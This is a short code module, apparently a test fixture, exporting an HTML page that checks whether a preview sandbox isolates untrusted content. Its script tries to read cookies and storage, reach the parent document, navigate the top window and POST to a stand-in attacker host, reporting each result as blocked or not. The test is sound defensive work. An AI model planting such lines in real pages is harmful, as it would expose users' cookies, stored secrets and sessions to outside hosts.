import reportHtml from "./report.html?raw";
export { reportHtml };

export const securityHtml = `<!doctype html><html><head>
<meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline'">
<base href="https://html-preview-attacker.invalid/">
<link rel="stylesheet" href="https://html-preview-attacker.invalid/style.css">
<style>body{font:15px/1.7 system-ui;padding:24px;color:#19332b;background:#f6f8f4}li{margin:10px 0}</style>
</head><body><h1>HTML isolation checks</h1><ul id="results"></ul>
<img src="https://html-preview-attacker.invalid/image" alt="Remote image is blocked">
<iframe src="https://html-preview-attacker.invalid/frame" title="Blocked child frame"></iframe>
<form action="https://html-preview-attacker.invalid/form" method="post"><input name="probe" value="test"></form>
<script src="https://html-preview-attacker.invalid/script.js"></script>
<script>
function result(name,value){const li=document.createElement('li');li.textContent=name+': '+value;document.querySelector('#results').append(li)}
function denied(name,action){try{action();result(name,'UNEXPECTED ACCESS')}catch{result(name,'blocked')}}
denied('Cookies',()=>document.cookie);
denied('Parent document',()=>parent.document.body);
denied('Parent cookies',()=>parent.document.cookie);
denied('Local storage',()=>localStorage.getItem('html-preview-secret'));
denied('Session storage',()=>sessionStorage.getItem('html-preview-secret'));
denied('Top navigation',()=>top.location.href='https://html-preview-attacker.invalid/top');
result('Popups',window.open('https://html-preview-attacker.invalid/popup')===null?'blocked':'UNEXPECTED ACCESS');
document.querySelector('form').submit();
fetch('/api/html-preview-probe',{credentials:'include'}).then(()=>result('API request','UNEXPECTED ACCESS')).catch(()=>result('API request','blocked'));
fetch('https://html-preview-attacker.invalid/collect',{method:'POST',body:'probe'}).then(()=>result('Remote request','UNEXPECTED ACCESS')).catch(()=>result('Remote request','blocked'));
</script></body></html>`;
